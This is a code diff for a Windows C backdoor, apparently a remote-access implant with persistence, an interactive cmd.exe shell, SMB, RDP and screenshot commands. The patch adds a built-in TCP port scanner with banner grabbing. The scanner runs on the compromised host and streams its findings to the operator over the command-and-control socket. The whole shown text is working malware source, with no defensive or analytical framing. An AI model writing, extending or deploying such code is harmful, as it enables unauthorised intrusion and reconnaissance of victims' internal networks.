@@ -24,8 +24,14 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <winsock.h>
+#include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+
+/* MSG_WAITALL is Winsock 2 — define for Winsock 1.1 builds */
+#ifndef MSG_WAITALL
+#  define MSG_WAITALL 0x8
+#endif
 
 /* -----------------------------------------------------------------------
  * Build-time defaults — CLU overrides via the patchable block below.
@@ -1305,6 +1311,311 @@ static int cmd_persist(SOCKET s, const char *args)
     return send_done(s);
 }
 
+/* Forward declarations for commands defined later but called from cmd_shell */
+static int cmd_smb(SOCKET s, const char *args);
+static int cmd_rdp(SOCKET s, const char *args);
+static int cmd_scan(SOCKET s, const char *args);
+
+/* -----------------------------------------------------------------------
+ * Embedded TCP scanner — cmd_scan
+ *
+ * Same async select-pool model as gridcli.  Results stream directly back
+ * over the C2 socket as TSV so Joshua can capture and hand off to Dumont.
+ * No threads; no SERVICES.DAT needed on target; self-contained.
+ *
+ * Protocol: lines of  HOST\tPORT/tcp\topen\tSERVICE\tBANNER\r\n
+ *           terminated with  <<<DONE>>>\n  as usual.
+ * ----------------------------------------------------------------------- */
+
+#define SC_POOL_DEF    32
+#define SC_POOL_MAX    64    /* must not exceed default FD_SETSIZE (64) */
+#define SC_TIMEOUT_DEF 500
+#define SC_PORTS_MAX   512
+
+typedef struct {
+    SOCKET         sk;
+    unsigned long  ip;
+    unsigned short port;
+    DWORD          deadline;
+    int            active;
+} ScSlot;
+
+/* Static scan state — reset before each scan                          */
+static ScSlot         sc_pool[SC_POOL_MAX];
+static unsigned short sc_ports[SC_PORTS_MAX];
+static int            sc_nports      = 0;
+static int            sc_pool_size   = SC_POOL_DEF;
+static int            sc_pool_active = 0;
+static int            sc_timeout_ms  = SC_TIMEOUT_DEF;
+static unsigned long *sc_hosts       = NULL;
+static int            sc_nhosts      = 0;
+static int            sc_work_idx    = 0;
+static int            sc_work_total  = 0;
+static int            sc_done_count  = 0;
+static int            sc_banner      = 0;
+static SOCKET         sc_c2          = INVALID_SOCKET;
+
+/* Inline service table — avoids SERVICES.DAT dependency on target    */
+static const struct { unsigned short p; const char *n; } sc_svcs[] = {
+    {21,"ftp"},{22,"ssh"},{23,"telnet"},{25,"smtp"},{53,"domain"},
+    {80,"http"},{88,"kerberos"},{110,"pop3"},{111,"rpcbind"},
+    {135,"msrpc"},{139,"netbios-ssn"},{143,"imap"},{161,"snmp"},
+    {389,"ldap"},{443,"https"},{445,"microsoft-ds"},{514,"rsh"},
+    {587,"submission"},{636,"ldaps"},{993,"imaps"},{995,"pop3s"},
+    {1080,"socks"},{1433,"ms-sql-s"},{1521,"oracle"},{2049,"nfs"},
+    {3306,"mysql"},{3389,"ms-wbt-server"},{4444,"aeldreC2"},
+    {5432,"postgresql"},{5900,"vnc"},{6379,"redis"},
+    {8080,"http-alt"},{8443,"https-alt"},{27017,"mongod"},{0,NULL}
+};
+
+static const char *sc_svc_lookup(unsigned short port)
+{
+    int i;
+    for (i = 0; sc_svcs[i].n; i++)
+        if (sc_svcs[i].p == port) return sc_svcs[i].n;
+    return "";
+}
+
+static void sc_reset(void)
+{
+    int i;
+    for (i = 0; i < SC_POOL_MAX; i++) {
+        if (sc_pool[i].active) { closesocket(sc_pool[i].sk); sc_pool[i].active = 0; }
+    }
+    if (sc_hosts) { free(sc_hosts); sc_hosts = NULL; }
+    sc_nhosts = sc_nports = sc_pool_active = 0;
+    sc_work_idx = sc_work_total = sc_done_count = 0;
+    sc_pool_size  = SC_POOL_DEF;
+    sc_timeout_ms = SC_TIMEOUT_DEF;
+    sc_banner     = 0;
+}
+
+static void sc_host_add(unsigned long ip)
+{
+    unsigned long *t;
+    t = (unsigned long *)realloc(sc_hosts, (size_t)(sc_nhosts + 1) * sizeof(unsigned long));
+    if (!t) return;
+    sc_hosts = t;
+    sc_hosts[sc_nhosts++] = ip;
+}
+
+static int sc_parse_target(const char *spec)
+{
+    char buf[128];
+    const char *sl;
+    int a, b, c, lo, hi, i;
+    unsigned long base;
+
+    strncpy(buf, spec, 127); buf[127] = '\0';
+    sl = strchr(buf, '/');
+    if (sl) {
+        int bits; char ipbuf[64]; unsigned long mask;
+        strncpy(ipbuf, buf, (int)(sl - buf)); ipbuf[sl - buf] = '\0';
+        bits = atoi(sl + 1);
+        if (bits < 1 || bits > 32) return 0;
+        base = ntohl(inet_addr(ipbuf));
+        if (base == (unsigned long)INADDR_NONE) return 0;
+        mask = bits ? (0xFFFFFFFFUL << (32 - bits)) : 0;
+        base &= mask;
+        for (i = 1; i < (int)(1UL << (32 - bits)) - 1; i++)
+            sc_host_add(htonl(base + (unsigned long)i));
+        return sc_nhosts > 0;
+    }
+    if (sscanf(buf, "%d.%d.%d.%d-%d", &a, &b, &c, &lo, &hi) == 5) {
+        for (i = lo; i <= hi; i++) {
+            char tmp[32]; unsigned long ip;
+            sprintf(tmp, "%d.%d.%d.%d", a, b, c, i);
+            ip = inet_addr(tmp);
+            if (ip != (unsigned long)INADDR_NONE) sc_host_add(ip);
+        }
+        return sc_nhosts > 0;
+    }
+    base = inet_addr(buf);
+    if (base != (unsigned long)INADDR_NONE) { sc_host_add(base); return 1; }
+    { struct hostent *he = gethostbyname(buf);
+      if (!he) return 0;
+      memcpy(&base, he->h_addr, 4);
+      sc_host_add(base); return 1; }
+}
+
+static int sc_parse_ports(const char *spec)
+{
+    const char *p = spec;
+    while (*p && sc_nports < SC_PORTS_MAX) {
+        char *end; int lo, hi, i;
+        lo = (int)strtol(p, &end, 10);
+        if (end == p) return 0; p = end;
+        if (*p == '-') { p++; hi = (int)strtol(p, &end, 10); if (end == p) return 0; p = end; }
+        else hi = lo;
+        for (i = lo; i <= hi && sc_nports < SC_PORTS_MAX; i++)
+            sc_ports[sc_nports++] = (unsigned short)i;
+        if (*p == ',') p++;
+    }
+    return sc_nports > 0;
+}
+
+static void sc_grab_banner(SOCKET sk, char *out, int olen)
+{
+    fd_set rs; struct timeval tv; int n; char *p;
+    out[0] = '\0';
+    FD_ZERO(&rs); FD_SET(sk, &rs);
+    tv.tv_sec = 0; tv.tv_usec = 300000;
+    if (select(0, &rs, NULL, NULL, &tv) <= 0) return;
+    n = recv(sk, out, olen - 1, 0);
+    if (n <= 0) { out[0] = '\0'; return; }
+    out[n] = '\0';
+    for (p = out; *p; p++) {
+        if (*p == '\r' || *p == '\n') { *p = '\0'; break; }
+        if ((unsigned char)*p < 0x20 || (unsigned char)*p > 0x7e) *p = '.';
+    }
+}
+
+static void sc_slot_open(int i, unsigned long ip, unsigned short port)
+{
+    SOCKET sk; u_long nb = 1; struct sockaddr_in sa;
+    sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sk == INVALID_SOCKET) { sc_done_count++; return; }
+    ioctlsocket(sk, FIONBIO, &nb);
+    memset(&sa, 0, sizeof(sa));
+    sa.sin_family      = AF_INET;
+    sa.sin_port        = htons(port);
+    sa.sin_addr.s_addr = ip;
+    connect(sk, (struct sockaddr *)&sa, sizeof(sa));
+    sc_pool[i].sk       = sk;
+    sc_pool[i].ip       = ip;
+    sc_pool[i].port     = port;
+    sc_pool[i].deadline = GetTickCount() + (DWORD)sc_timeout_ms;
+    sc_pool[i].active   = 1;
+    sc_pool_active++;
+}
+
+static void sc_slot_close(int i)
+{
+    if (!sc_pool[i].active) return;
+    closesocket(sc_pool[i].sk);
+    sc_pool[i].active = 0;
+    sc_pool_active--;
+    sc_done_count++;
+}
+
+static void sc_tick(void)
+{
+    fd_set wfds, efds; struct timeval tv; int i; DWORD now;
+
+    /* Fill idle slots */
+    for (i = 0; i < sc_pool_size && sc_work_idx < sc_work_total; i++) {
+        if (!sc_pool[i].active) {
+            int hi = sc_work_idx / sc_nports;
+            int pi = sc_work_idx % sc_nports;
+            sc_slot_open(i, sc_hosts[hi], sc_ports[pi]);
+            sc_work_idx++;
+        }
+    }
+    if (sc_pool_active == 0) return;
+
+    FD_ZERO(&wfds); FD_ZERO(&efds);
+    for (i = 0; i < sc_pool_size; i++) {
+        if (sc_pool[i].active) { FD_SET(sc_pool[i].sk, &wfds); FD_SET(sc_pool[i].sk, &efds); }
+    }
+    tv.tv_sec = 0; tv.tv_usec = 10000;
+    select(0, NULL, &wfds, &efds, &tv);
+
+    now = GetTickCount();
+    for (i = 0; i < sc_pool_size; i++) {
+        if (!sc_pool[i].active) continue;
+        if (FD_ISSET(sc_pool[i].sk, &wfds)) {
+            int err = 0, elen = sizeof(err);
+            getsockopt(sc_pool[i].sk, SOL_SOCKET, SO_ERROR, (char *)&err, &elen);
+            if (err == 0) {
+                char banner[81]; char host_str[20]; char line[256];
+                struct in_addr ia; ia.s_addr = sc_pool[i].ip;
+                strncpy(host_str, inet_ntoa(ia), sizeof(host_str) - 1);
+                if (sc_banner) sc_grab_banner(sc_pool[i].sk, banner, 80);
+                else banner[0] = '\0';
+                sprintf(line, "%s\t%u/tcp\topen\t%s\t%s\r\n",
+                        host_str, (unsigned)sc_pool[i].port,
+                        sc_svc_lookup(sc_pool[i].port), banner);
+                send_str(sc_c2, line);
+            }
+            sc_slot_close(i);
+        } else if (FD_ISSET(sc_pool[i].sk, &efds)) {
+            sc_slot_close(i);
+        } else if ((long)(now - sc_pool[i].deadline) >= 0) {
+            sc_slot_close(i);
+        }
+    }
+}
+
+static int cmd_scan(SOCKET s, const char *args)
+{
+    /* scan <target> [-p ports] [-t ms] [-T pool] [-b]                */
+    char  target[256] = "";
+    char  ports_spec[256] = "";
+    const char *p;
+    int   i;
+
+    sc_reset();
+    sc_c2 = s;
+
+    if (!args || !args[0]) {
+        send_str(s, "scan: usage: scan <target> [-p ports] [-t ms] [-T pool] [-b]\r\n");
+        return send_done(s);
+    }
+
+    /* Simple arg parser — first non-flag token is the target         */
+    { char tmp[512]; strncpy(tmp, args, 511); tmp[511] = '\0';
+      p = tmp;
+      while (*p) {
+          while (*p == ' ') p++;
+          if (*p == '-') {
+              char flag = *(p+1); p += 2; while (*p == ' ') p++;
+              if (flag == 'p') {
+                  i = 0;
+                  while (*p && *p != ' ' && i < 255) ports_spec[i++] = *p++;
+                  ports_spec[i] = '\0';
+              } else if (flag == 't') {
+                  sc_timeout_ms = atoi(p); if (sc_timeout_ms < 50) sc_timeout_ms = 50;
+                  while (*p && *p != ' ') p++;
+              } else if (flag == 'T') {
+                  sc_pool_size = atoi(p);
+                  if (sc_pool_size < 1) sc_pool_size = 1;
+                  if (sc_pool_size > SC_POOL_MAX) sc_pool_size = SC_POOL_MAX;
+                  while (*p && *p != ' ') p++;
+              } else if (flag == 'b') {
+                  sc_banner = 1;
+              }
+          } else if (!target[0]) {
+              i = 0;
+              while (*p && *p != ' ' && i < 255) target[i++] = *p++;
+              target[i] = '\0';
+          } else {
+              while (*p && *p != ' ') p++;
+          }
+      }
+    }
+
+    if (!target[0]) {
+        send_str(s, "scan: no target specified\r\n"); return send_done(s);
+    }
+    if (!sc_parse_target(target)) {
+        send_str(s, "scan: cannot parse target\r\n"); return send_done(s);
+    }
+
+    /* Default ports if none specified                                 */
+    if (!ports_spec[0])
+        strncpy(ports_spec, "21,22,23,25,53,80,110,135,139,143,389,443,445,1433,3306,3389,5432,5900,8080", 255);
+    if (!sc_parse_ports(ports_spec)) {
+        send_str(s, "scan: cannot parse port list\r\n"); sc_reset(); return send_done(s);
+    }
+
+    sc_work_total = sc_nhosts * sc_nports;
+    while (sc_work_idx < sc_work_total || sc_pool_active > 0)
+        sc_tick();
+
+    sc_reset();
+    return send_done(s);
+}
+
 /* -----------------------------------------------------------------------
  * Interactive shell — bidirectional pipe to cmd.exe / COMMAND.COM
  *
@@ -1400,6 +1711,7 @@ static int cmd_shell(SOCKET s, const char *shell_path)
                         else if (cmd_is(tcmd,"cwd"))        cmd_cwd(s);
                         else if (cmd_is(tcmd,"smb"))        cmd_smb(s, cmd_arg(tcmd,"smb"));
                         else if (cmd_is(tcmd,"rdp"))        cmd_rdp(s, cmd_arg(tcmd,"rdp"));
+                        else if (cmd_is(tcmd,"scan"))       cmd_scan(s, cmd_arg(tcmd,"scan"));
                         else if (cmd_is(tcmd,"screenshot")) cmd_screenshot(s);
                         else { send_str(s,"!: unknown tank command\r\n"); send_done(s); }
                     }
@@ -1662,6 +1974,7 @@ static void run_session(SOCKET s)
         else if(cmd_is(cmd,"cat"))        rc=cmd_cat(s,cmd_arg(cmd,"cat"));
         else if(cmd_is(cmd,"less"))       rc=cmd_less(s,cmd_arg(cmd,"less"));
         else if(cmd_is(cmd,"persist"))    rc=cmd_persist(s,cmd_arg(cmd,"persist"));
+        else if(cmd_is(cmd,"scan"))       rc=cmd_scan(s,cmd_arg(cmd,"scan"));
         else if(cmd_is(cmd,"shell"))      rc=cmd_shell(s,shell);
         else                              rc=exec_command(s,cmd,shell);
         if(rc<0) return;
